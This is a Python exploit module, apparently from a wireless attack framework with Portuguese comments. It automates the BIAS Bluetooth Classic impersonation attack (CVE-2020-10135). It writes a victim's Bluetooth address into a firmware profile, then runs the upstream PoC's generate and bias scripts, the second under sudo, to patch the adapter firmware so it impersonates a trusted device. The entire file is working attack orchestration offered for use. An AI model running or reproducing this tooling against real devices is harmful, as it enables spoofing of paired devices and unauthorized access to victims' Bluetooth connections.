#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
# Version: 1.0.0
"""Bridge subprocess para francozappa/bias (CVE-2020-10135) — BIAS Bluetooth.

Orquestra ``generate.py`` (Python 3) e ``bias.py`` (Python 2) no diretório ``bias/``
do repositório upstream. O campo ``btadd`` do perfil IF é ajustado para ``target_address``
antes do generate; o ficheiro IF original é restaurado ao final.

Referência: https://github.com/francozappa/bias
"""

from __future__ import annotations

import json
import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any, Dict, List, Optional

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

_VALID_ROLES = frozenset({"master", "slave"})


class Exploit(Exploit):
    """Ponte subprocess para BIAS (impersonação Bluetooth clássico)."""

    __info__ = {
        "name": "BIAS Attack Bridge",
        "description": (
            "CVE-2020-10135: impersonação durante estabelecimento de sessão segura "
            "BR/EDR. Executa generate.py e bias.py do subtree bias/ (subprocess). "
            "Atualiza temporariamente btadd em bias/IF_PIXEL2.json, "
            "restaura após o fluxo. ``role`` documenta o cenário master vs slave "
            "(ordem de conexão conforme README upstream). Requer hardware/CYW + "
            "internalblue conforme PoC. Version: 1.0.0"
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "francozappa/bias contributors (subprocess)",
        ),
        "references": (
            "https://github.com/francozappa/bias",
            "https://francozappa.github.io/publication/bias/",
            "https://nvd.nist.gov/vuln/detail/CVE-2020-10135",
        ),
        "devices": ("bluetooth_classic", "bias", "internalblue"),
    }

    target_address = OptMAC("", "BD_ADDR a gravar em btadd do perfil IF (impersonação)")
    role = OptString(
        "slave",
        "Papel documental: master | slave (ordem de conexão conforme README BIAS)",
    )
    dry_run = OptBool(False, "Somente exibir comandos, sem alterar IF nem executar")

    def _bias_dir(self) -> Optional[Path]:
        """Resolve ``bias-attack/bias`` no superprojeto."""
        here = Path(__file__).resolve()
        candidates = (
            here.parents[5] / "bias-attack" / "bias",
            here.parents[4] / "bias-attack" / "bias",
            here.parents[6] / "IoT" / "bias-attack" / "bias",
        )
        for c in candidates:
            if (c / "generate.py").is_file() and (c / "bias-template.py").is_file():
                return c.resolve()
        return None

    def _tmp_backup(self, if_path: Path) -> Path:
        """Caminho de backup do IF sob ``WirelessXPL-Forge/.tmp``."""
        forge_root = Path(__file__).resolve().parents[4]
        tmp = forge_root / ".tmp"
        tmp.mkdir(parents=True, exist_ok=True)
        return tmp / "{}.bias_bridge.bak".format(if_path.name)

    def _norm_btadd(self, raw: str) -> str:
        """Normaliza BD_ADDR para o formato ``aa:bb:...`` do JSON IF."""
        s = str(raw).strip().lower().replace("-", ":")
        parts = s.split(":")
        if len(parts) != 6:
            return s
        return ":".join(p.zfill(2) for p in parts)

    def _python3(self) -> str:
        """Intérprete Python 3 para generate.py."""
        for name in ("python3", "python"):
            w = shutil.which(name)
            if w:
                return w
        return "python3"

    def _python2(self) -> str:
        """Intérprete Python 2 para bias.py."""
        if os.name == "nt":
            py_launcher = shutil.which("py")
            if py_launcher:
                return py_launcher
        for name in ("python2", "python"):
            w = shutil.which(name)
            if w:
                return w
        return "python2"

    def _bias_argv(self, py: str, bias_dir: Path) -> List[str]:
        """Monta argv para ``bias.py`` (``py -2`` no Windows quando necessário)."""
        script = str(bias_dir / "bias.py")
        if os.name == "nt" and Path(py).stem.lower() == "py":
            return [py, "-2", script]
        return [py, script]

    def _patch_if_btadd(self, if_path: Path, btadd: str) -> str:
        """Substitui ``btadd`` no JSON IF.

        Args:
            if_path: Ficheiro IF existente.
            btadd: Novo endereço normalizado.

        Returns:
            Conteúdo original (UTF-8) para restauração.
        """
        original = if_path.read_text(encoding="utf-8")
        data: Dict[str, Any] = json.loads(original)
        data["btadd"] = btadd
        if_path.write_text(
            json.dumps(data, indent=4, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
        return original

    def run(self) -> None:
        """Executa generate + bias ou apenas relata o plano (dry_run)."""
        bias_dir = self._bias_dir()
        if not bias_dir:
            print_error(
                "bias-attack/bias não encontrado. Clone francozappa/bias em "
                "submodules/IoT/bias-attack.",
            )
            return

        role = str(self.role).strip().lower()
        if role not in _VALID_ROLES:
            print_error("role deve ser master ou slave.")
            return

        bt = self._norm_btadd(str(self.target_address))
        if not bt or bt == "00:00:00:00:00:00":
            print_error("Defina target_address (BD_ADDR válido para btadd).")
            return

        if_path = (bias_dir / "IF_PIXEL2.json").resolve()
        if not if_path.is_file():
            print_error("Ficheiro IF não encontrado: {}".format(if_path))
            return

        gen_cmd = [self._python3(), str(bias_dir / "generate.py")]
        py2 = self._python2()
        bias_cmd = self._bias_argv(py2, bias_dir)

        logger.info("BIAS bias_dir=%s role=%s", bias_dir, role)
        print_info(
            "Papel BIAS (documental): {} — slave: vítima conecta ao impersonador; "
            "master: atacante inicia conexão à vítima (ver README upstream).".format(
                role,
            ),
        )

        if self.dry_run:
            print_info("DRY RUN — comandos:")
            print_status("1) patch btadd={} em {}".format(bt, if_path.name))
            print_status("2) " + " ".join(gen_cmd))
            print_status("3) " + " ".join(bias_cmd))
            print_info("cwd: {}".format(bias_dir))
            return

        backup_path = self._tmp_backup(if_path)
        original_content: Optional[str] = None
        try:
            shutil.copy2(if_path, backup_path)
            original_content = self._patch_if_btadd(if_path, bt)
            logger.info("IF patch btadd=%s backup=%s", bt, backup_path)

            print_status("BIAS: generate.py...")
            r1 = subprocess.run(
                gen_cmd,
                cwd=str(bias_dir),
                capture_output=True,
                text=True,
                check=False,
            )
            if r1.stdout:
                logger.info("generate stdout:\n%s", r1.stdout.rstrip())
                print_info(r1.stdout.rstrip())
            if r1.stderr:
                logger.warning("generate stderr:\n%s", r1.stderr.rstrip())
                print_status(r1.stderr.rstrip())
            if r1.returncode != 0:
                print_error("generate.py saiu com código {}".format(r1.returncode))
                return

            print_status("BIAS: bias.py (InternalBlue / patchrom)...")
            full_bias = bias_cmd
            if os.name != "nt" and os.geteuid() != 0:
                sudo = shutil.which("sudo")
                if sudo:
                    full_bias = [sudo] + bias_cmd
                    logger.info("sudo para bias.py (acesso firmware).")

            r2 = subprocess.run(
                full_bias,
                cwd=str(bias_dir),
                capture_output=False,
                text=True,
                check=False,
            )
            if r2.returncode == 0:
                print_success("bias.py finalizou com código 0.")
            else:
                print_error("bias.py saiu com código {}".format(r2.returncode))
        except Exception as exc:
            print_error(str(exc))
            logger.exception("BIAS bridge")
        finally:
            if original_content is not None:
                if_path.write_text(original_content, encoding="utf-8")
                logger.info("IF restaurado: %s", if_path)
                print_info("Perfil IF restaurado a partir do backup em memória.")
